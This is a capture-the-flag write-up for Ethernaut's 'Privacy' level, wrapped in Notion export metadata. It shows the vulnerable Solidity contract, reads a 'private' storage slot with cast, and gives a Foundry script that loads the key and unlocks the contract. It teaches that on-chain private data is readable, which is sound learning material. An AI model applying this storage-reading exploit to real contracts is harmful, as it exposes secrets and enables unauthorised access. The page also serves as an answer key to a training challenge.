---
title: "Privacy"
date: "2024-02-10"
lastmod: "2024-02-14T16:51:00.000Z"
draft: false
difficulty: "⭐⭐⭐"
prev: "Elevator-59c41c694afa45c68e603000da840a2e"
weight: 13
state: "En cours"
level-url: "https://ethernaut.openzeppelin.com/level/12"
next: "Gatekeeper-One-9bbda6efa6c24367aa643eb73ae92a6a"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "0141c599-3182-4d74-a831-1099eb338d5d"
  created_time: "2024-02-12T13:39:00.000Z"
  last_edited_time: "2024-02-14T16:51:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel12.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "aa1cb61f-428e-4dc4-abad-06b3092cb0ce"
        name: "⭐⭐⭐"
        color: "green"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Elevator-59c41c694afa45c68e603000da840a2e"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Elevator-59c41c694afa45c68e603000da840a2e"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-10"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 13
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "e1f6ef4b-49ae-427f-9bb4-8736089f3aa2"
        name: "En cours"
        color: "blue"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/12"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Gatekeeper-One-9bbda6efa6c24367aa643eb73ae92a6a"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Gatekeeper-One-9bbda6efa6c24367aa643eb73ae92a6a"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Privacy"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Privacy"
          href: null
  url: "https://www.notion.so/Privacy-0141c59931824d74a8311099eb338d5d"
  public_url: null
UPDATE_TIME: "2024-02-14T17:11:21.627Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


title: Privacy
weight: 13
type: docs
prev: elevator
next: gatekeeper-one


[Level12](https://ethernaut.openzeppelin.com/level/12) - ⭐⭐⭐


---


The creator of this contract was careful enough to protect the sensitive areas of its storage.


Unlock this contract to beat the level.


Things that might help:

- Understanding how storage works
- Understanding how parameter parsing works
- Understanding how casting works

Tips:

- Remember that metamask is just a commodity. Use another tool if it
is presenting problems. Advanced gameplay could involve using remix, or
your own web3 provider.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true; // slot 0
  uint256 public ID = block.timestamp; // slot 1
  uint8 private flattening = 10; // slot 2
  uint8 private denomination = 255; // slot 2
  uint16 private awkwardness = uint16(block.timestamp); // slot 2
  bytes32[3] private data; // [slot3, slot4, slot5]

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```


for more details on storage layout read this article:


[bookmark](https://docs.alchemy.com/docs/smart-contract-storage-layout)


So, the `_key` is stored at slot 5 since it is `data[2]`:


```solidity
➜  ~/repos/ethernaut (main) cast storage --rpc-url $SEPOLIA_RPC_URL $INSTANCE_12 5
0xe32410e9fbc1f17b0f1d9a6ed141317f11c4b2a5d38981dfa025aacf8b708d7d
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Privacy} from "../src/12.sol";


contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_12");

        vm.startBroadcast(deployerPrivateKey);

        Privacy privacy = Privacy(addr);
        console.log('isLocked : %s', privacy.locked());
				
				// vm.load() allows us to read arbitrary storage slot
        bytes16 key = bytes16(vm.load(address(privacy), bytes32(uint(5))));
        privacy.unlock(key);
        
        console.log('isLocked : %s', privacy.locked());

        vm.stopBroadcast();

    }
}
```


Nothing
 in the ethereum blockchain is private. The keyword private is merely an
 artificial construct of the Solidity language. Web3's `getStorageAt(...)`
 can be used to read anything from storage. It can be tricky to read 
what you want though, since several optimization rules and techniques 
are used to compact the storage as much as possible.


It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": [How to read Ethereum contract storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)


More info:


[bookmark](https://medium.com/@0xZorz/how-to-read-dynamic-arrays-directly-from-storage-using-foundry-bdf5a104b8f6)

